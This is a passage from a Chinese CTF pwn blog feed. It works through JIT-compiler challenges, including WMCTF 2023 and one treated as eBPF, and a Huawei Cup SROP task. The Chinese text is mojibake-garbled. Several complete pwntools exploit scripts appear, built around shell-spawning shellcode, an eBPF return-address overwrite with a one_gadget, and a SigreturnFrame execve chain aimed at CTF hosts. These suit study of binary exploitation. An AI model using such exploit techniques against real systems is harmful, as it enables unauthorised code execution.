class="hljs-built_in">var2idx</span>(v2);<br>        imm = IRstream::<span class="hljs-built_in">getimm</span>();<br>        AsmHelper::<span class="hljs-built_in">imm2var</span>(var, imm);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1 = Compiler::<span class="hljs-built_in">var2idx</span>(v3);<br>        v4 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2 = Compiler::<span class="hljs-built_in">var2idx</span>(v4);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2);               <span class="hljs-comment">// mov [rbp-var2],[rbp-var1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1);<br>        AsmHelper::<span class="hljs-built_in">regassign</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        v5 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v5);<br>        v6 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v6);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_0);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_0);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x21</span>u);             <span class="hljs-comment">// and [rbp-var2_0],[rbp-var1_0]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        v7 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v7);<br>        v8 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v8);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_1);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_1);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">9u</span>);                <span class="hljs-comment">// or [rbp-var2-1],[rbp-var1_1]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        v9 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v9);<br>        v10 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v10);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_2);             <span class="hljs-comment">// xor [rbp-var2_2],[rbp-var2_1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_2);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x31</span>u);<br>        <span class="hljs-keyword">break</span>;<br>       <br></code></pre></td></tr></table></figure><p>æœ€å<code>AsmHelper::func_ret</code>æ¢å¤æ ˆå¸§ï¼Œè¿™æ ·<code>just in time</code> åŸºæœ¬ä¸Šå°±å¥½äº†</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">JITHelper::</span>finailize()`å°†`exec_memory`çš„`rwx`æƒé™æ”¹ä¸º`r_x<br></code></pre></td></tr></table></figure><p>åé¢çš„ä¸€è¿ä¸²checkæ˜¯ä½¿ç¬¬ä¸€æ¬¡è½¬æ±‡ç¼–çš„è¾“å…¥çš„<code>id</code>å’Œ<code>args</code>å¿…é¡»ä¸º0</p><p><img src="/img/C++/18.png" alt="img"></p><p>ç„¶åå°±æ˜¯æ‰§è¡Œäº†<code>exec_memory</code>äº†</p><h3 id="åˆ©ç”¨ğŸ³ï¸ğŸ³ï¸"><a href="#åˆ©ç”¨ğŸ³ï¸ğŸ³ï¸" class="headerlink" title="åˆ©ç”¨ğŸ³ï¸ğŸ³ï¸"></a>åˆ©ç”¨ğŸ³ï¸ğŸ³ï¸</h3><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ‰§è¡Œçš„æ—¶å€™æ²¡æœ‰<code>write</code>æƒé™ï¼ŒğŸ‘´è¯¥æ€ä¹ˆå¾€ä¸Šå†™<code>shellcode</code>å‘¢</p><p>ğŸ‘´ä¸€å¼€å§‹æƒ³çš„æ˜¯åœ¨æ ˆä¸Šå¸ƒç½®<code>rop</code>é“¾ï¼Œä½†æ˜¯è¦å…ˆæ³„éœ²<code>libc</code>ï¼Œä¹Ÿ<code>pass</code>äº†</p><p>è¿™æ˜¯æ€ä¹ˆç»˜äº‹æ</p><p>åæ¥çœ‹äº†rodeğŸ‘´çš„wpï¼Œåˆå­¦åˆ°äº†æ–°çš„ä¸œè¥¿</p><p>å› ä¸ºcase 1ä¸­movåˆ°æ ˆä¸Šçš„æ˜¯8å­—èŠ‚ï¼Œäºæ˜¯å¯ä»¥æ˜¯<code>â€œxor rax, rax; jmp short&quot;</code>è¿™ç§çŸ­è·³è½¬ä»£ç ï¼Œé‚£ğŸ‘´æ‡‚å•¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x1ddf)\nc\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\xff\x00\x00\x20&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8b&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>                            <span class="hljs-comment">#mov [rbp-0xb*8], /bin/sh</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8a&#x27;</span> + p64(<span class="hljs-number">0xffffffffff00</span>)                       <span class="hljs-comment">#mov [rbp-0xa*8], 0xffffffffff00</span><br>payload += <span class="hljs-string">b&#x27;\x01\x89&#x27;</span> + p64(<span class="hljs-number">0x47</span>)                                 <span class="hljs-comment">#mov [rbp-9*8], 0x47</span><br>payload += <span class="hljs-string">b&#x27;\x01\x88&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xf6\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rsi, rsi; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x87&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xd2\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rdx, rdx; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x86&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xc0\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rax, rax; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x85&#x27;</span> + <span class="hljs-string">b&quot;\x04\x3b\xeb\x0d\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#add al, 0x3b; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x84&#x27;</span> + <span class="hljs-string">b&quot;\x0f\x05\x00\x00\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#syscall</span><br>payload += <span class="hljs-string">b&#x27;\x03\xa0\x8a&#x27;</span>                                         <span class="hljs-comment">#and [rbp], [rbp-0xa*8]</span><br>payload += <span class="hljs-string">b&#x27;\x04\xa0\x89&#x27;</span>                                         <span class="hljs-comment">#or [rbp], [rbp-9*8]</span><br>payload += <span class="hljs-string">b&#x27;\x00\x8b&#x27;</span>                                             <span class="hljs-comment">#mov rdi,[rbp-b*8];ret</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="WMCTF-2023-JITğŸ¥µ"><a href="#WMCTF-2023-JITğŸ¥µ" class="headerlink" title="WMCTF 2023 JITğŸ¥µ"></a>WMCTF 2023 JITğŸ¥µ</h2><p>just in time ï¼Œåˆæ˜¯ä½ ï¼ï¼</p><p>ğŸ‘´åªæ˜¯æƒ³æŠŠC++pwné¢˜å­¦æ˜ç™½ï¼ŒğŸ‘´æœ‰ä»€ä¹ˆé”™ï¼Œè¦æ‹¿2000è¡Œçš„å±å±±ä»£ç æ¥æ¶å¿ƒğŸ‘´</p><h3 id="å†é€†äº¿ä¸‹"><a href="#å†é€†äº¿ä¸‹" class="headerlink" title="å†é€†äº¿ä¸‹"></a>å†é€†äº¿ä¸‹</h3><p>å…ˆè¾“å…¥<code>program</code>å’Œ<code>memory</code>ï¼Œ<code>program</code>è¦æ˜¯16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œ<code>memory</code>è¦æ˜¯<code>len(program) //2</code></p><p><img src="/img/C++/19.png" alt="img"></p><p>è¿™è¾¹å¤§è‡´æ˜¯åˆ›å»ºè™šæ‹Ÿæœºå¹¶è¿›è¡Œä¸€ç³»åˆ—åˆå§‹åŒ–çš„è¿‡ç¨‹ï¼Œå…·ä½“æ“ä½œğŸ‘´ä¹Ÿæ²¡é€†æ˜ç™½</p><p><img src="/img/C++/20.png" alt="img"></p><p>ç„¶åå°±æ˜¯æ ¸å¿ƒ<code>code</code></p><p><img src="/img/C++/21.png" alt="img"></p><p><code>func_8510</code>é‡Œï¼Œé€šè¿‡<code>func_84e0--&gt;func_8370--&gt;func_5a50</code>è¿™ä¸ª2000è¡Œçš„å±å±±æŠŠè¾“å…¥çš„<code>program</code>ç¿»è¯‘æˆæ±‡ç¼–å­˜å‚¨åœ¨ç”³è¯·å‡ºæ¥çš„<code>chunk</code>é‡Œ</p><p><code>mmap</code>ä¸€ç‰‡å†…å­˜ï¼ŒæŠŠ<code>chunk</code>é‡Œçš„æ±‡ç¼–<code>copy</code>è¿‡å»ï¼Œç„¶å<code>mprotect</code>æ”¹æˆ<code>r_x</code>æƒé™</p><p><code>call rax</code>å°±æ˜¯æ‰§è¡Œç¿»è¯‘çš„æ±‡ç¼–</p><p><img src="/img/C++/22.png" alt="img"></p><p>æœ€åæœ‰ä¸ª<code>result</code>è¾“å‡ºçš„æ˜¯æ‰§è¡Œå®Œåçš„å¯„å­˜å™¨<code>rax</code>å€¼</p><p>å·®ä¸å¤šäº†ï¼Œå¿«åäº†</p><p>ğŸ˜­ğŸ˜­ğŸ˜­</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>é—®é¢˜æ¥äº†ï¼Œé‚£ä¸ª2000è¡Œçš„ä»£ç ç­‰ğŸ‘´çœ‹å®Œä¼°è®¡æ˜¯å¤©éƒ½äº®äº†ï¼ŒğŸ‘´æœæ–­å»çœ‹wpï¼Œå‘ç°å¾ˆå¤šğŸ‘´éƒ½è¯´è¿™æ˜¯<code>ebpf</code></p><p>ğŸ‘´ï¼šï¼Ÿï¼Ÿï¼Ÿ</p><p>ğŸ‘´ï¼šå¦ˆå¦ˆç”Ÿçš„ï¼Œè¿™æ˜¯ä¸ªä»€ä¹ˆç©æ„</p><p>ç„¶åğŸ‘´å°±å»æ‰¾è¿™ç©æ„çš„<a href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md">æŒ‡ä»¤é›†</a></p><p>ä¸€è¯•ï¼Œå¯¹ä¸Šäº†ï¼Œé‚£å°±å¥½åŠäº†</p><p>å…ˆè¿ä¸Šæ‰¾ä¸ªlibcå€¼ç»™raxï¼Œæ‰“å°å‡ºæ¥åº·åº·libcç‰ˆæœ¬</p><p>ç„¶åå°±æ˜¯oggè¦†ç›–è¿”å›åœ°å€ï¼Œå› ä¸ºğŸ‘´è«å¾—æ‰¾åˆ°syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># rax:0</span><br><span class="hljs-comment"># rdi:1</span><br><span class="hljs-comment"># rsi:2</span><br><span class="hljs-comment"># rdx:3</span><br><span class="hljs-comment"># r9:4</span><br><span class="hljs-comment"># r8:5</span><br><span class="hljs-comment"># rbx:6</span><br><span class="hljs-comment"># r13:7</span><br><span class="hljs-comment"># r14:8</span><br><span class="hljs-comment"># r15:9</span><br><span class="hljs-comment"># rbp:a</span><br><br>program = <span class="hljs-string">b&#x27;61a0380100000000&#x27;</span>   <span class="hljs-comment">#mov eax,[rbp-0x138]</span><br>program += <span class="hljs-string">b&#x27;1400000083400200&#x27;</span>  <span class="hljs-comment">#sub eax,libc.sym[&#x27;__libc_start_main&#x27;]+243</span><br>program += <span class="hljs-string">b&#x27;04000000043b0e00&#x27;</span>  <span class="hljs-comment">#add eax,ogg</span><br>program += <span class="hljs-string">b&#x27;7b8a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],r14</span><br>program += <span class="hljs-string">b&#x27;630a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],eax</span><br>program += <span class="hljs-string">b&#x27;af22000000000000&#x27;</span>  <span class="hljs-comment">#xor rsi, rsi</span><br>program += <span class="hljs-string">b&#x27;af33000000000000&#x27;</span>  <span class="hljs-comment">#xor rdx, rdx</span><br>memory = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(program)//<span class="hljs-number">2</span>).encode()<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x2947)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,program)<br>leak(<span class="hljs-string">&quot;libc_start_main&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">243</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,memory)<br><br><br><span class="hljs-comment"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [r12] == NULL || r12 == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [rsi] == NULL || rsi == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯ğŸ‘´çš„é”™è§‰ï¼Œ<code>JIT</code>æ€»ç»™ğŸ‘´ä¸€ç§ç”¨<code>shellcode</code>å®Œæˆåˆ©ç”¨æ–¹å¼çš„<code>vm</code>é¢˜</p><p>çœŸçš„é€†åæƒ¹ğŸ¤®ğŸ¤®ğŸ¤®</p><p>è€Œä¸”ğŸ‘´æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ€ä¹ˆé‚£ä¹ˆå¤šğŸ‘´çœ‹åˆ°é¢˜ä¸€çœ¼å°±çŸ¥é“æ˜¯<code>ebpf</code>ï¼Ÿï¼Ÿï¼Ÿ</p><p>åç»­ï¼š</p><p><img src="/img/C++/23.png" alt="img"></p><p>ğŸ‘´&lt;â€”â€”ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p><h1 id="0xff-å†™åœ¨æœ€åçš„æœ€å"><a href="#0xff-å†™åœ¨æœ€åçš„æœ€å" class="headerlink" title="0xff:å†™åœ¨æœ€åçš„æœ€å"></a>0xff:å†™åœ¨æœ€åçš„æœ€å</h1><p>é€†ä¸åŠ¨äº†ï¼ŒçœŸtmé€†ä¸åŠ¨äº†ï¼Œæ±—æµæµƒèƒŒäº†å·²ç»ğŸ¥µğŸ¥µğŸ¥µ</p><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://zqy.ink/2023/05/12/dingjiqiandao/">N1CTF Junior 2023 pwn é¡¶çº§ç­¾åˆ° èµ›é¢˜å¤ç° | å¼ æ¸…è¶Š (zqy.ink)</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md">6.1 Pwn - 6.1.8 pwn DCTF2017 Flex - ã€ŠCTF ç«èµ›å…¥é—¨æŒ‡å—(CTF All In One)ã€‹ - ä¹¦æ ˆç½‘ Â· BookStack</a></p><p><a href="https://www.anquanke.com/post/id/89855#h3-8">Shanghai-DCTF-2017 çº¿ä¸‹æ”»é˜²Pwné¢˜-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://arttnba3.cn/2021/01/20/CTF-0X02-STARCTF2021-PWN/#0x02-babygame-double-free-tcache-poisoning">ã€CTF.0X02ã€‘*CTF2021-Pwn WP - arttnba3â€™s blog</a></p><p><a href="https://www.cnblogs.com/winmt/articles/17018284.html">NepnepxCATCTF Pwn-Chao WriteUp - winmt - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/">2023è¥¿æ¹–è®ºå‰‘åˆèµ›pwn-jit - roderick - record and learn! (roderickchan.cn)</a></p><p><a href="https://lst-oss.github.io/2023/08/23/jit-pwn/#2023-wmctf-jit">jit-pwn - Hexo (lst-oss.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åä¸ºæ¯</title>
    <link href="/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <url>/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>åˆ«é—®ï¼Œé—®å°±æ˜¯ğŸ‘´å¿˜è®°æ‰¾ç ”é™¢çš„è”ç³»è€å¸ˆå®¡æ ¸äº†ï¼ŒæŠ¥åæ²¡æŠ¥ä¸Šï¼Œæéº»éº»æ»´ã€‚ä¸€æƒ³åˆ°è¿›å†³èµ›å°±èƒ½å›æµ™æ±Ÿè€ï¼Œæˆ‘èº«ä¸Šä»¿ä½›æœ‰èš‚èšåœ¨çˆ¬</p><p>ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p><h1 id="0x1-pwné¢˜è§£"><a href="#0x1-pwné¢˜è§£" class="headerlink" title="0x1:pwné¢˜è§£"></a>0x1:pwné¢˜è§£</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>ä»€ä¹ˆğŸ‘´æ•¢å«è‡ªå·±master of asmå•Šï¼ŒçŸ¥ä¸çŸ¥é“è‡ªå·±æœ‰å‡ æ–¤å°é©¬çç å•Š</p><p>å°±ç®€å•çš„srop</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>import sys<br><span class="hljs-built_in">context</span>.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-built_in">context</span>.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>flag = <span class="hljs-number">0</span><br>if flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-symbol">else:</span><br>    p = process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>sa = lambda s,n : p.sendafter(s,n)<br>sla = lambda s,n : p.sendlineafter(s,n)<br>sl = lambda s : p.sendline(s)<br>sd = lambda s : p.send(s)<br>rc = lambda n : p.recv(n)<br>ru = lambda s : p.recvuntil(s)<br>ti = lambda : p.interactive()<br>leak = lambda name,<span class="hljs-keyword">addr </span>:log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(<span class="hljs-keyword">addr))</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">xor_0 </span>= <span class="hljs-number">0x40103d</span><br>rax_2 = <span class="hljs-number">0x401030</span><br><span class="hljs-keyword">xor_1 </span>= <span class="hljs-number">0x401034</span><br><span class="hljs-keyword">syscall </span>= <span class="hljs-number">0x40102d</span><br><span class="hljs-keyword">bin_sh </span>= <span class="hljs-number">0x40200a</span><br><br>exec_fun = SigreturnFrame()<br>exec_fun.rax = <span class="hljs-number">0x3b</span><br>exec_fun.rdi = <span class="hljs-keyword">bin_sh</span><br><span class="hljs-keyword"></span>exec_fun.rsi = <span class="hljs-number">0</span><br>exec_fun.rdx = <span class="hljs-number">0</span><br>exec_fun.rip = <span class="hljs-keyword">syscall</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shellcode </span>= p64(<span class="hljs-keyword">xor_0)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">syscall)\</span><br><span class="hljs-keyword"></span>            + <span class="hljs-keyword">bytes(exec_fun)</span><br><span class="hljs-keyword"></span><br>p.send(<span class="hljs-keyword">shellcode.ljust(0x190,b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword"></span>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-ssp"><a href="#ez-ssp" class="headerlink" title="ez_ssp"></a>ez_ssp</h2><p>ğŸ‘´å½“åˆé“¸å¸äº†ï¼ŒğŸ‘´çŸ¥é“æ˜¯stack smashï¼Œä½†ğŸ‘´ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´åœ¨æƒ³ä¸€æ¬¡æº¢å‡ºå°±æŠŠflagæ³„éœ²å‡ºæ¥ï¼Œçˆ†ç ´æ ˆåœ°å€çˆ†äº†å¥½ä¹…éƒ½æ²¡æˆåŠŸã€‚</p><p>ç„¶åç»“æœåªè¦è½»è½»æ³„éœ²gotè¡¨åœ°å€ï¼Œå†ç”¨libcæŠŠ_environé‡Œçš„æ ˆåœ°å€æ‹¿å‡ºæ¥å°±å¥½äº†ï¼Œè‰</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 